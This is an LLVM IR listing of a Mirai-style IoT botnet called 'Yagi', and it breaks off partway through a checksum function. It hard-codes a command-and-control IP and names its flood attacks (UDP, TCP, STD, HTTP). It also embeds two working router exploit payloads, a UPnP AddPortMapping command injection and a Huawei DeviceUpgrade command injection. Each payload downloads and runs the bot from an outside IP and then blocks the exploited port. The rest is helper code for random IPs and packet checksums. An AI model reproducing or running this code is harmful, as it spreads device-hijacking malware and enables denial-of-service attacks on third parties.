; ModuleID = 'host/ir_O0/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@c2_bot_port = global i32 27, align 4
@c2_http_host = global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = global i64 0, align 8
@UserAgents = global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@attackpids = common global i32* null, align 8
@retry = global i32 1, align 4
@retrys = global i32 3, align 4
@tryagain = global i32 1, align 4
@max_attacks = global i32 4, align 4
@maxboot_time = global i32 600, align 4
@trigger = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = global i32 -1, align 4
@ioctl_pid = global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@pongresponse = common global [25 x i8] zeroinitializer, align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = global i32 0, align 4
@exploit_fake_time = global i32 0, align 4
@conn_table = common global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = global i32 0, align 4
@huawei_fake_time = global i32 0, align 4
@huawei_rsck = global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554832193, align 4

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

; <label>:33:                                     ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29

; <label>:39:                                     ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
